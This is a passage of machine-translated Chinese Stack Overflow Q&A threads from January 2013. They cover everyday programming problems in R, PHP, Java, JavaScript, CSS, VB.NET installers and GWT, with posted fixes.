    p <- ggplot() + geom_point(data = data, aes_string(x = fac1, y = res, color = fac2,
        group = fac2)) # works fine if we stop here

    # Due to a bug in ggplot2_0.9.3, we must calc some quantities
    # and put them in a separate data frame for a new aesthetic
    avg <- aggregate(data[,res] ~ data[,fac1]*data[, fac2], data, FUN = mean)
    names(avg) <- c("factor1", "factor2", "mean")   
    p <- p + geom_line(aes_string(x = 'factor1', y = 'mean', group = 'factor2'), data = avg)
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-24T06:27:34.783

我必须进行两项更改才能使您的功能正常工作。首先，在 ggplot2 0.9.3（及之前）中存在一个错误，其中评估环境`aes()`默认为全局环境。解决方法：让它在调用环境（例如，你的函数的环境）中评估，使用`ggplot(..., environment = environment()`.

另一个变化是在最后一行，你有`p <- p + geom_line(..., data=avg)`. `ggplot`关键是您必须从主调用中关闭美学继承，因为您的`avg`数据集没有该`fac2`列。为此，请使用`geom_line(..., inherit.aes=FALSE)`.

```
testFunc <- function(formula = NULL, data = NULL) {
  res <- as.character(formula[[2]])
  fac1 <- as.character(formula[[3]][2])
  fac2 <- as.character(formula[[3]][3])

  # Specify the data & aesthetics     
  p <- ggplot(data, aes_string(x = fac1, y = res, color = fac2, group = fac2),
    environment = environment())

  # Now add points
  p <- p + geom_point()

  # Due to a bug in ggplot2_0.9.3, we must calc some quantities
  # and put them in a separate data frame for a new aesthetic
  avg <- aggregate(data[,res] ~ data[,fac1]*data[, fac2], data, FUN = mean)
  names(avg) <- c("factor1", "factor2", "mean")   
  p + geom_line(aes_string(x = 'factor1', y = 'mean', group = 'factor2'), 
    inherit.aes = FALSE, data = avg)
}

ex <- testFunc(formula = r ~ f1*f2, data = td)
print(ex) 
```

# facebook - 如何使用 Graph API 从“关于”选项卡中删除 Facebook 页面属性

> ID：14348782
> 
> 赞同：4
> 
> 时间：2013-01-15T23:22:52.750
> 
> 标签：facebook, facebook-graph-api, attributes, facebook-page

我已经[按照此链接上](https://developers.facebook.com/docs/reference/api/page/#attributes)的此功能的文档，使用 Graph API 成功设置了我的 Facebook 页面的属性。例如，我可以`general_info`通过发送包含以下内容的帖子正文来设置字段：

```
access_token=<MY_PAGE_ACCESS_TOKEN>&general_info=This+is+some+general+info. 
```

但现在我想删除`general_info`. 我假设发送带有空字符串的帖子正文会删除它

```
access_token=<MY_PAGE_ACCESS_TOKEN>&general_info= 
```

但我回来了

```
{
    "error":{
        "message":"(#100) Parameters do not match any fields that can be updated",
        "type":"OAuthException",
        "code":100
    }
} 
```

我也试过：

```
access_token=<MY_PAGE_ACCESS_TOKEN>&general_info=None 
```

和

```
access_token=<MY_PAGE_ACCESS_TOKEN>&general_info=null 
```

但这些只是将我的一般信息设置为“无”和“空”。我还尝试发送 JSON 内容以便`null`明确，但 API 似乎只是响应，好像它根本无法处理 JSON。

我的另一个想法是，它可能需要一个 HTTP DELETE 请求，但据我所知，Graph API 不会为这些可用于 DELETE 请求的属性返回任何 id。

有没有人这样做过？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:27:29.070

尝试发送空间。

```
access_token=<MY_PAGE_ACCESS_TOKEN>&general_info=+ 
```

这可能有效

# php - 访问其他键后无法访问数组键

> ID：14348786
> 
> 赞同：0
> 
> 时间：2013-01-15T23:23:02.387
> 
> 标签：php, arrays

问这个我觉得很愚蠢，但这是怎么回事

```
 foreach ($fbuser['feed']['data'] as $fbmsg){

            var_dump($fbmsg['message']);
            die; 
```

产生我想要的确切结果，它显示了数组键'message'的内容......

...虽然这会引发一个错误，指出键“消息”未定义...

```
 foreach ($fbuser['feed']['data'] as $fbmsg){

           $r .= '<tr><td class="fb_td"><img src="https://graph.facebook.com/'.$fbmsg['from']['id'].'/picture" class="fb_img"></td><td>'.
                     ' <i>'.$fbmsg['from']['name'].'</i><br>'.
                     $fbmsg['message'].'</td></tr>';
      } 
```

这是 var_dump，显然包含一个 ['message'] 键...

```
array(19) { ["id"]=> string(28) "167669502405_366091400140059" ["from"]=> array(3) { ["category"]=> string(21) "Professional services" ["name"]=> string(9) "Warp Nine" ["id"]=> string(12) "167669502405" } ["message"]=> string(47) "Nu finns Warp Nine's annons pÃ¥ pizzakartonger!" ["story"]=> string(40) "Warp Nine shared Annonspizza AB's photo." ["story_tags"]=> array(2) { [0]=> array(1) { [0]=> array(5) { ["id"]=> string(12) "167669502405" ["name"]=> string(9) "Warp Nine" ["offset"]=> int(0) ["length"]=> int(9) ["type"]=> string(4) "page" } } [17]=> array(1) { [0]=> array(5) { ["id"]=> string(15) "182446165166120" ["name"]=> string(14) "Annonspizza AB" ["offset"]=> int(17) ["length"]=> int(14) ["type"]=> string(4) "page" } } } ["picture"]=> string(83) "http://photos-d.ak.fbcdn.net/hphotos-ak-ash4/384287_370171156393619_242673100_s.jpg" ["link"]=> string(105) "http://www.facebook.com/photo.php?fbid=370171156393619&set=a.347118762032192.78549.182446165166120&type=1" ["name"]=> string(15) "Timeline Photos" ["caption"]=> string(88) "Vi har Ã¤ven nÃ¥got att lÃ¤sa dÃ¥ vi Ã¤ter pizzan. SÃ¥hÃ¤r ser kartongen ut pÃ¥ insidan!" ["properties"]=> array(1) { [0]=> array(3) { ["name"]=> string(2) "By" ["text"]=> string(14) "Annonspizza AB" ["href"]=> string(71) "http://www.facebook.com/pages/Annonspizza-AB/182446165166120?ref=stream" } } ["icon"]=> string(59) "http://static.ak.fbcdn.net/rsrc.php/v2/yD/r/aS8ecmYRys0.gif" ["privacy"]=> array(1) { ["value"]=> string(0) "" } ["type"]=> string(5) "photo" ["status_type"]=> string(12) "shared_story" ["object_id"]=> string(15) "370171156393619" ["application"]=> array(2) { ["name"]=> string(6) "Photos" ["id"]=> string(10) "2305272732" } ["created_time"]=> string(24) "2012-10-04T21:05:55+0000" ["updated_time"]=> string(24) "2012-10-04T21:05:55+0000" ["comments"]=> array(1) { ["count"]=> int(0) } } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:28:44.667

啊，没关系 - 前 7 个键有它，最后有一个缺少它，这当然使整个事情崩溃，甚至没有打印前几个正确的键。对不起。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:29:55.877

如果你有三个数组，`$fbuser['feed']['data']`并且 array1 有一个消息键，但 array2 和 array3 没有，那么你会收到一个错误。

尝试：

```
foreach ($fbuser['feed']['data'] as $fbmsg){
    $r .= '<tr><td class="fb_td"><img src="https://graph.facebook.com/'.$fbmsg['from']['id'].'/picture" class="fb_img"></td><td>'.
             ' <i>'.$fbmsg['from']['name'].'</i><br>'.
             (isset($fbmsg['message'])?$fbmsg['message']:'').'</td></tr>';
} 
```

# java - 在枚举中使用反射但总是得到 NoSuchMethodException

> ID：14348789
> 
> 赞同：1
> 
> 时间：2013-01-15T23:23:18.747
> 
> 标签：java, reflection, enums, talend

我正在为 Talend Open Studio 构建一个自定义组件，以从应用程序 (JIRA) 访问数据源，该应用程序有一个包装器来获取其所有数据。它为它的所有数据结构公开了一个充满非常不稳定的 getter 的 API。由于 Talend Open Studio 仅支持原始类型，我通常需要链接多个调用来获取原始数据（即 Project.getProjectDetail().getOwner().getName()）

但是这些 API 经常变化，我不想每次都更改我的代码。所以我决定使用方法的枚举：当一个新字段被暴露时，我只需要在枚举中添加一个元素。像这样的东西：

（为了简洁，我把大部分元素都删掉了）

```
public enum JiraProjectField {

    KEY(new String[]{"getKey"}),
    COMPONENTS_NUM(new String[]{"getComponents", "size"}),

    private Method[] m;
    private ArrayList<Class<?>> r;

    private JiraProjectField(String[] methods) {

        this.r = new ArrayList<Class<?>>(methods.length);

        Class<?> initClass = Project.class;
        for(int i=0; i< methods.length; i++){
            try {
                m[i] = initClass.getMethod(methods[0], (Class<?>)null);
                r.add(m[i].getReturnType());
                initClass = m[i].getReturnType();
            } catch (SecurityException e) {
                throw new ExceptionInInitializerError(e.toString());
            } catch (NoSuchMethodException e) {
                throw new ExceptionInInitializerError(e.toString());
            }
        }
} 
```

但我总是得到一个 NoSuchMethodException，即使我*确定*具有该名称的方法存在。有什么我不知道的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:44:49.280

我不确定您为什么不更多地使用可变参数，但您可以尝试

```
m[i] = initClass.getMethod(methods[i]); 
```

# amazon-web-services - 在 MWS 响应中获取 UPC

> ID：14348791
> 
> 赞同：1
> 
> 时间：2013-01-15T23:23:27.617
> 
> 标签：amazon-web-services, amazon-mws, amazon-product-api

使用 ListMatchingProducts 或 GetMatchingProductForId 操作时，UPC 是否在结果中的任何位置返回？

如果是这样，我该如何访问它？

如果不是，我应该使用什么服务从亚马逊请求它？产品广告 API（以前称为 ECS）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-25T19:14:38.950

不知何故，我在产品广告 API 文档中完全错过了这一点！

对于响应组 Medium 和 Large，使用以下命令访问结果对象中的 UPC：

```
$ecsResponse->Items->Item->ItemAttributes->UPC 
```

# json - JSON响应自定义响应内容

> ID：14348794
> 
> 赞同：0
> 
> 时间：2013-01-15T23:23:40.510
> 
> 标签：json, spring, spring-mvc, jackson

我已经实现了一个 spring mvc 3 代码来获取 JSON 响应（在 jackson mapper 的帮助下）

```
@RequestMapping(value = "/getallroles", method = RequestMethod.GET)
@ResponseBody
public JsonJtableResponse1 getAllRoles(){
    List<Role> roleList = testService.getAllRoles();
    JsonJtableResponse1 jstr = new JsonJtableResponse1("OK",roleList);
    return jstr;
} 
```

JSON 响应对象是这样的。

```
public class JsonJtableResponse1 {

    private String Result;

    private List<Role> Records;

    public JsonJtableResponse1(String Result) {
        this.Result = Result;
    }

    public JsonJtableResponse1(List<Role> Records) {
        this.Records = Records;
    }

    public JsonJtableResponse1(String Result, List<Role> Records) {
        this.Result = Result;
        this.Records = Records;
    }

    public String getResult() {
        return Result;
    }

    public void setResult(String Result) {
        this.Result = Result;
    }

    public List<Role> getRecords() {
        return Records;
    }

    public void setRecords(List<Role> Records) {
        this.Records = Records;
    }   
} 
```

从 spring 方法 getAllRoles() 返回的 JSON 是

```
{"result":"OK","records":[
{"custId":"1","name":"aaa","birthYear":"1982","employer":"XX","infoAsOfDate":"20130110","disabled":"true"},
{"custId":"2","name":"bbb","birthYear":"1982","employer":"YY","infoAsOfDate":"20130111","disabled":"true"},
{"custId":"3","name":"ccc","birthYear":"1982","employer":"XX","infoAsOfDate":"20130108","disabled":"false"},
{"custId":"4","name":"ddd","birthYear":"1981","employer":"TT","infoAsOfDate":"20130107","disabled":"true"}
]} 
```

我需要 JSON 作为 - [注意两个元素中的大写 R]

```
{"Result":"OK","Records":[ ....................
 ..............................................
]} 
```

使用 Jakson 映射器创建 JSON 响应时考虑了对象的 getter/setter 名称。如何实现所需的 JSON 响应格式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:48:13.540

您可以使用注释自定义名称`@JsonProperty`：

```
@JsonProperty("Result")
public String getResult() {
    return Result;
} 
```

如果您需要将所有属性名称的第一个字母大写，则可以通过扩展`PropertyNamingStrategy`. 例如，您可以阅读这篇博文[http://www.cowtowncoder.com/blog/archives/2011/03/entry_448.html](http://www.cowtowncoder.com/blog/archives/2011/03/entry_448.html)。

# jquery - Ajax 在返回 json 时说未定义的属性

> ID：14348795
> 
> 赞同：0
> 
> 时间：2013-01-15T23:23:46.847
> 
> 标签：jquery

我似乎有点吃醋了。

我无法让 ajax 返回值 UserID，我收到此错误：Uncaught TypeError: Cannot read property '0' of undefined。

继承人的PHP：

```
$array = array(
    "UserID" => $row['UserID']
    , "runDate" => $row['runDate']
    , "firstName" => $row['firstName']
    , "Time" => $row['Time']
    , "Time" => $row['Distance']
);   
echo  json_encode($array); 
```

和 AJAX：

```
$.ajax({
    type: "POST",
    url: "searchbydateMySQLi.php",
    cache: false,
    dataType: "json",
    data: "date=" + $('input[name="date"]').val(),
    success: function(data){ 
        console.log(data.UserID[0]);
    },
}); 
```

我尝试将数据类型切换为 HTML 并返回整个字符串。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:32:29.713

回显 json 时，您必须设置内容类型，因为浏览器无法识别 PHP 默认发送的字符串`text/html`为 json，这意味着您的`data`变量不是您期望的。公平地说，为什么浏览器要解决这个问题？

```
header("Content-type: application/json");
echo json_encode($array);
die; 
```

之后立即死亡/退出是个好主意

# postgresql - 使用 JPA Criteria Builder 创建正确的子字符串函数

> ID：14348799
> 
> 赞同：0
> 
> 时间：2013-01-15T23:24:00.843
> 
> 标签：postgresql, jpa

我很难使用 JPA CriteriaBuilder 执行以下操作：

```
SUBSTRING( field, LENGTH( field ) - 7 ) 
```

我正在使用的数据库没有 RIGHT 功能，如果有，我可以执行以下操作：

```
builder.function( "RIGHT", String.class, fieldExp, builder.literal(7) ); 
```

但没有骰子。虽然 CriteriaBuilder 确实有一个子字符串函数表达式，但我无法弄清楚如何从 LENGTH 中减去文字 7。

有什么想法吗？TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:44:15.827

好的，明白了。

```
builder = builder.substring( field, builder.diff( builder.length( field ), 7 ); 
```

# php - PHP 和绝对路径，但它在一秒钟前还在工作

> ID：14348804
> 
> 赞同：0
> 
> 时间：2013-01-15T23:24:22.493
> 
> 标签：php, absolute-path

我没有看到错误..

我在网络根目录下有一个索引文件。索引文件设置具有基本路径的数组，如下所示：

```
$medium    = 'web';
$framework = '_magma';
$js_lib    = '_lava';
$path_info = pathinfo($_SERVER['SCRIPT_NAME']);
$base_path = $path_info['dirname'];
print_r($base_path);

$paths = ['root'      => $base_path,
          'framework' => $framework,
          'js_lib'    => $js_lib,
          'medium'    => '/' . $medium,
          'uri'       => $_SERVER['REQUEST_URI']];

try {
    if (!include($paths['root'] . $paths['framework'] . '/core/AutoLoader.php')) {
        throw new Exception ('<b>Error - AutoLoader is missing</b>');
    }
    $loader   = new AutoLoader($paths);
    $appStack = new BootStrap($paths);
    $app      = new StartPage($paths, $appStack->getConfig());
    $app->start();
} catch (Exception $e) {
    echo
        '<p><b>EXCEPTION</b><br />Message: '
        . $e->getMessage()
        . '<br />File: '
        . $e->getFile()
        . '<br />Line: '
        . $e->getLine()
        . '</p>';
} 
```

index 然后在“/framework/core”下实例化 BootStrap，并将上述数组传递给将其设置在类本身中的构造函数。

BootStrap 然后在“/framework/web”下实例化 StartPage，并再次通过构造函数传递路径数组。

StartPage 然后使用路径变量实例化一个设置样式表的类，该类位于“/web/stylesheets”下，如下所示：

```
class CssInclusion {

    private $paths;
    private $include_css;

    public function __construct($paths, $include_css) {

        // set variables
        $this->paths = $paths;
        $this->include_css = $include_css;
    }

    public function loadStylesheets() {

        // set path
        $directory_path = $this->paths['root'] . $this->paths['medium']. '/stylesheets';

        // loop through stylesheet array
        foreach ($this->include_css as $stylesheet) {

            // include stylesheet, handle exceptions
            $file_path = $directory_path . '/' .  $stylesheet . '.css';
            print_r($file_path);
            try {
                if (!is_file($file_path)) {
                    throw new Exception ('<b>Error - missing stylesheet:</b> ' . $file_path . '<br />');
                }
                echo '<link rel="stylesheet" type="text/css" href="' . $file_path . '" />';
            } catch (Exception $e) {
                echo
                    '<p><b>EXCEPTION</b><br />Message: '
                    . $e->getMessage()
                    . '<br />File: '
                    . $e->getFile()
                    . '<br />Line: '
                    . $e->getLine()
                    . '</p>';
            }
        }
    }
} 
```

我没有遇到异常，但样式表没有加载。这很奇怪。你新鲜的眼睛能看到我错过的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:33:31.303

您的根路径是一个绝对系统路径，例如`srv/www`. 但是样式表路径必须是浏览器可访问的相对或绝对路径。

`http://yoursite/css`或者`/css`

我像这样得到我的basePath：

```
$pathInfo = pathinfo($_SERVER['SCRIPT_NAME']);
$basePath = $pathInfo['dirname']; 
```

也许您只需要更改该行：

```
$directory_path = $this->paths['medium']. '/stylesheets'; 
```

不知道`$this->paths['medium']`里面有什么？！

# java - 在实现 Runnable 的类中分配变量的最快方法是什么？

> ID：14348805
> 
> 赞同：0
> 
> 时间：2013-01-15T23:24:29.313
> 
> 标签：java, android

我有一个 A 类，它有一个 B 类对象。B 类有一个布尔变量 bool，A 实例不断更新（关闭事件）。B 对象 b 实现 Runnable。

```
class A{
  private B b;
}

class B implements Runnable{
  private boolean bool;

  run(){
    while(true){
      if(bool){//do something}
    }
  }
} 
```

我假设 boolean bool 实际上在 a 的线程上，因为它在 a 调用 B 的构造函数时被初始化，并且 b 线程直到在 b 实例上调用 start 才开始，并且直到 bool 被初始化后才调用 start。

如果是这种情况，那么 b 线程必须保留它自己的 bool 副本。如果是这种情况，从 a 更改 bool 以使 b 线程可以看到它的最快方法是什么？使 bool 不稳定，或者有什么方法可以直接分配给 b 的副本？

请忘记循环，它适用于 GLES20。我需要知道的是 b 是否有它的 bool 副本，以及事件线程在 GL 线程上不断更新布尔值的最快方法是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:28:37.970

如果在某个阶段对变量的读取和写入可以在不同的线程上，则需要某种形式的同步。在这种情况下，最明智的选择是：

*   `bool`易变_
*   使用[_`AtomicBoolean`](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/atomic/AtomicBoolean.html)

但是，根据您的用例，可能有更好的方法来实现您的目标，方法是使用适当的并发对象（例如锁存器、信号量或队列）并避免不必要地使用许多 CPU 周期的忙等待。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T21:46:50.793

Java 的 Exchanger 似乎是我所需要的。它在线程之间建立一个对象，而不是在每个事务中生成一个新对象并在事务之后对它进行 GC。

这里有一个很好的解释和代码：

[http://www.javacodegeeks.com/2011/09/exchanger-and-gc-less-java.html](http://www.javacodegeeks.com/2011/09/exchanger-and-gc-less-java.html)

# java - Eclipse 不允许使用父类中定义的设置器

> ID：14348808
> 
> 赞同：-1
> 
> 时间：2013-01-15T23:24:46.220
> 
> 标签：java, constructor, setter, getter

我很高兴我找到了这个论坛。我是 Java 新手（初学者），正在学习如何使用 setter、getter 和构造函数。我遇到了一个错误，不知道如何解决它。请帮助我隔离此错误。我写了两个类，第一个是一个名为 MyCalc 的简单 Java 应用程序，它有两个方法 Add()、Multiply() 和一个 setter setXY。MyCalc 类是使用静态 void main() 实例化的。

第二类“MyCalcTest”调用第一类。独立的 java 应用程序 MyCalc 运行良好，没有错误。但是当我尝试使用来自 MycalcTest 的 setter 'setXY' 来设置参数值时，elipse 不允许我使用 setXY。有什么理由吗？

这是两个类的代码：

1)

```
public class MyCalc {

    private double x, y;

    //findout why it's throwing an error using setXY method from MyClacTest class
    public void setXY(double x, double y) {
        this.x = x;
        this.y = y;
    }
    //this constructor with params works fine when called from MyCalcTest class
    /*public MyCalc(double a, double b){
        this.x = a;
        this.y = b;
    }*/

    //getters
    public double Add(){
        return x+y;
    }

    public double Multiple(){
        return (x * y);
    }

    public static void main(String[] args) {
        //this works when called MyCalc with parameters
        //MyCalc calc = new MyCalc(5, 5);

        MyCalc calc = new MyCalc();
        calc.setXY(5, 5);
        System.out.println("Addition: " + calc.Add());
        System.out.println("multiplication :" + calc.Multiple());

    }

} 
```

2)

```
public class MyCalcTest {

        //this works when called MyCalc with parameters
        //MyCalc calc = new MyCalc(5, 5);

        MyCalc calc = new MyCalc();

        //this doesn't workto set x,y why??
        calc.setXY(5, 5);

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:29:33.297

```
calc.setXY(5, 5); 
```

必须在方法/构造函数/初始化块内。

```
public class MyCalcTest {

    MyCalc calc;
    public MyCalcTest (){
    calc = new MyCalc();
    calc.setXY(5, 5);

      }
} 
```

# html - ie 8 browser issure div 出现在下一行

> ID：14348809
> 
> 赞同：0
> 
> 时间：2013-01-15T23:24:48.643
> 
> 标签：html, css, internet-explorer-8

在 ie8 中，跨度标签正在下降，它们不在同一行中如何修复它..我改变了宽度，它不起作用

[http://jsfiddle.net/DA9gK/26/](http://jsfiddle.net/DA9gK/26/)

```
<div style="height: 54px;">
          <span class="companyLogo">Company LOGO</span>
          <span class="quotes" style=" ">Quotes</span>
          <span class="saleOrders" >Sale Orders</span>
          <span class="invoice">Invoice</span>
          <span class="openAr" >Open AR</span>
          <div style="margin-left:592px; ">
            <span class="payments" style=" height: 21px; width: 94px;">Payments</span>
            <span class="createMemos" style=" height: 21px; width: 94px;">Create Memos</span>
            <span class="rma" style=" height: 21px; width: 94px;">RMA</span>
            <span class="crm" style=" height: 21px; width: 94px;">CRM</span>
          </div>
      </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:51:28.140

div.container 的宽度由 bootstrap.css 设置为 1000px。第二个 div（包含 span）的左边距为 592px。span 内容的宽度加上左边距大于 1000px，因此它将 spans 换行到下一行。

为了演示，我将容器宽度覆盖为“auto！important”。

```
.container {
  margin: 0 auto;
  width:auto !important;      
} 
```

[http://jsfiddle.net/VXXPC/](http://jsfiddle.net/VXXPC/)

编辑：另一个演示，我调整了这些跨度的左边距：

```
.quotes {
  ...
  margin-left: 400px;
}

element.style {
  margin-left: 552px;
} 
```

[http://jsfiddle.net/3QTny/](http://jsfiddle.net/3QTny/)

考虑使用浮点数而不是左边距。

# vb.net - VB .NET 安装项目 - 许可协议 - 强制用户在同意之前滚动？

> ID：14348810
> 
> 赞同：2
> 
> 时间：2013-01-15T23:25:04.323
> 
> 标签：vb.net, setup-project

我们正在使用 Visual Studio 2010 和 .NET 4。我们已经使用 VB .NET 中的标准工具构建了一个安装项目，但现在我们有一个要求，这意味着我们必须强制用户在他们之前滚动到许可协议的底部可以点击“我同意”。我相信我们确实在网上找到了一个使用 ORCA 的 C++ 项目解决方案，但这并没有达到预期的效果，速度太慢，并且滚动导致文本无法阅读。任何帮助将不胜感激。

这就是我们将许可协议对话框添加到安装项目的方式：

[如何在安装项目中添加许可协议](https://stackoverflow.com/questions/4182364/how-to-add-licence-agreement-in-the-setup-project)

但是我们不确定如何添加自定义逻辑来处理滚动条。我们可能需要自定义许可对话框或提供此功能的外部开源应用程序。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-18T23:42:49.623

您真的应该考虑切换到不同的设置构建器解决方案。

甚至[Microsoft 也停止](http://blogs.msdn.com/b/buckh/archive/2011/03/17/visual-studio-setup-projects-vdproj-will-not-ship-with-future-versions-of-vs.aspx)了对其在 Visual Studio 2012（以及所有未来版本）中的安装程序解决方案的支持。

我强烈推荐[Inno Setup](http://www.jrsoftware.org/)，因为它具有灵活性和强大功能。

实际上，通过快速搜索，我找到了一种完全符合您要求的方法，就在 StackOverflow：[wpLicese Page check if ScrollBars position is max (Inno Setup)](https://stackoverflow.com/questions/10584610/wplicese-page-check-if-scrollbars-position-is-max-inno-setup)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-19T21:02:02.380

对于同样的问题，我已经切换到[SharpSetup](http://sharpsetup.eu)。这是 MSI 安装程序的包装器，它具有在 .NET 中创建的安装程序 GUI 窗口。您可以只使用可用的 SharpSetup LicenseStep 窗口并将其更改为您的需要。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-20T01:47:03.150

好吧，我想我做到了！这是一个相当麻烦的解决方案，但它确实有效......

您可以通过下载此“虚拟”设置自行测试：[MySetup](http://software.xfx.net/stackoverflow/MySetup.exe)

以下是它的工作原理： MySetup 实际上是一个用 VB.NET 编写的应用程序，其中包含实际的 MSI 设置文件作为资源。

当您启动 MySetup 时，它会启动实际设置，然后启动一个监视线程以查找 RichTextBox 控件并不断测试滚动条拇指的位置。

然后，根据该值（并且选择“我同意”单选按钮），它启用或禁用“下一步”按钮。

如果您愿意，可以在此处下载源代码：[LAChecker/MySetup](http://software.xfx.net/stackoverflow/LAChecker.zip)

希望这可以帮助...

# gwt - 模型驱动的动态对象图——数据源还是自定义方法？

> ID：14348811
> 
> 赞同：1
> 
> 时间：2013-01-15T23:25:07.300
> 
> 标签：gwt, smartgwt

我有一些关于使用 smartGWT 选择哪条路径的基本问题。我已经玩了一段时间了，到目前为止已经习惯了小部件的东西。有问题（尤其是浏览器），但谁没有……

我有一个自定义对象检索机制，具有触发标准 gwt-rpc-async 方案的本地描述符/对象缓存和解析器。我正在用 ID 和属性而不是数据集交换对象。它们表示为客户端中已经存在的树/网络。因此，每当我探索图形/树时，都会加载新对象。或者，如果已经存在于缓存中，则重用（这避免了实体递归）。

为了显示树和列表，我没有使用数据源。我已经设法手动创建自己的**树**对象，在加载某些内容时更新节点/子节点，设置属性等。到目前为止，这是动态的。我正在使用**setData()将****Tree**设置为**TreeGrid**，并且 Tree 中的大多数更改（添加、添加列表、删除等）都会立即反映在视图中。

 **但问题从这里开始。我喜欢模型驱动的方法，模型（树）对数据/对象做一些事情（更改属性，添加/删除节点）并通知视图（TreeGrid）。只有模型知道如何处理数据以及何时处理数据。但是没有/很少包含方法，这一切都在引擎盖下（JavaScript）。我可以编写自己的 EventHandler 并连接到 TreeGrid（它又具有**refreshRow()**等方法）。但由于未知的影响、内存泄漏等，我对使用 smartGWT 执行此操作感到不安。

在我看来，smartGWT 中的视图和模型似乎过于耦合。我正在为我的对象图使用一个模型，该模型可用于*不同*类型的视图（TreeGrid、ListGrid，甚至自定义画布），但我不知道哪个会显示我的数据。对于列表，我只使用根节点的子节点，对于树，我使用整个模型。

似乎大部分 smartGWT 真的是为 DataSources 构建的。为什么不使用它？ **对象图**是异构的。不可预料的。可能有同质的东西的集合，但我又不是。它无法与不同的数据库结果集相提并论。对象字段已在客户端通过其描述符（类）进行分析。此外，我使用*接口*：可以直接访问对象属性，也可以通过解析接口来访问。这意味着“ITimeObject.time”将被解析为“TelephoneCall.starTime”中的实现属性。我不知道如何创建这样的数据源...？

更糟的是：我拥有基于角色和权限的对象访问权限。这意味着某个用户可能会看到所有字段，而另一个用户只能看到部分字段。

一旦我创建了应该为视图（动态）构建的解析器和模型，我想在代码中的任何地方使用它，而不是为每个调用/视图创建“映射”。一切都是即时构建的，在用户界面中，我对具体类型、对象等一无所知。描述都来自后端。

**好的**。现在的问题:) 只需要在这里澄清很多东西。我需要提示从这里选择哪条路径。

1.  继续。使用自己的模型/视图。

    1a。我能否实现数据源提供的所有功能，如过滤、搜索、编辑/验证？

    1b。如何手动实现模型->视图通知？像 nodeUpdated(TreeNode node, boolean childrenToo) 这样没有副作用的东西，例如关闭视图时，设置新模型，破坏画布

    1c。到处都有数据源，表单，编辑器等。有办法将我自己的模型插入其中吗？

2.  不挂断。使用 DataSource 一切皆有可能。

    2a. 然后，我如何在客户端中动态创建数据源（使用我现有的模型），这些数据源对检索到的内容和打算显示的内容具有自适应性和敏感性。拥有视图描述（字段）和“接受的来源”，我可以探索对象图。

    2b。是否可以避免“父 ID”方案？这意味着它从一个已知对象开始自上而下。它还可以在列表中多次包含相同的对象，或者是不同父母的孩子。

* * *

很抱歉冗长的描述。我没有具体的代码问题要发布 atm，因为我还没有编辑等，只是显示。我想分析我是否应该从这里继续，因为我遇到了 Tree/TreeGrid 通信的限制。

谢谢你的想法:)**

# java - 计时器到分钟：秒：数百秒

> ID：14348815
> 
> 赞同：0
> 
> 时间：2013-01-15T23:25:34.740
> 
> 标签：java, timer

> **可能重复：**
> [如何将毫秒转换为“hh:mm:ss”格式？](https://stackoverflow.com/questions/9027317/how-to-convert-milliseconds-to-hhmmss-format)

我敢打赌，很多人需要一个计时器，其中包括：`minutes : seconds : hundreds of seconds`. 显然，您从以下内容开始：

```
` public TimeGame(){

    timer = new Timer(10, new ActionListener() {
        @Override
        public void actionPerformed(ActionEvent e) {
            counter++;
        }
    });
    timer.start();
}` 
```

然后你需要调用一个方法来将这个计数器转换为 : `minutes : seconds : hundreds of seconds`。

```
`private String timeTransfer(){

     minutes = counter/6000;
     counter = counter - (minutes*6000);
     seconds = counter/100 ;
     counter = counter - (seconds*100);
     milliseconds = counter;
     return minutes + " : " + seconds + " : " + miliseconds;
 }` 
```

但是我的方法中有一个错误。一旦达到 100 毫秒，它就会跳回 0。通常它必须放`0:1:0`，但它会跳回`0:0:0`。所有变量都在类中声明为私有。

所以我的问题是有人知道更好的方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T23:29:48.430

建议：

*   除了你的数学是关闭的，一个基本的计时器规则：永远不要相信计时器的时间间隔。而是存储初始系统时间，从当前系统时间中减去它，并将您的计算基于实时，而不是基于一些人为的计数器增量。
*   此外，您正在使用*幻*数，并且需要避免它们。而是使用 SECONDS_PER_MINUTE 和 MINUTES_PER_HOUR 等常量，这将帮助您避免粗心的数学错误。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-15T23:32:50.977

这是这段代码的规范形式，多年来由许多人多次编写：

```
private String timeTransfer(){

     minutes = counter/6000;
     seconds = (counter % 6000) /100 ;
     milliseconds = counter % 100;
     return minutes + " : " + seconds + " : " + milliseconds;
 } 
```

另一位发帖人评论说，以这种方式使用计时器是不准确的。如果你只是运行这个东西几分钟，错误不会加起来太多。如果您做的时间超过几分钟，您将需要使用系统时间来处理此问题。

首先，在初始化计数器时存储当前时间：

```
long startTime = System.currentTimeMillis(); 
```

然后，您在返回之前从开始时间定期更新计数器`timeTransfer()`

```
if (milliseconds < 10) {
    counter = (System.currentTimeMillis() - start) / 10;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T23:29:44.150

您的方法 timeTransfer() 修改了类成员变量`counter`。将其复制到方法开头的局部变量并对其执行计算，例如：

```
 long counter = this.counter; 
```

# android - 屏幕中间的android导航选项卡

> ID：14348816
> 
> 赞同：4
> 
> 时间：2013-01-15T23:25:38.777
> 
> 标签：android, android-layout, android-actionbar, android-tabhost, android-tabs

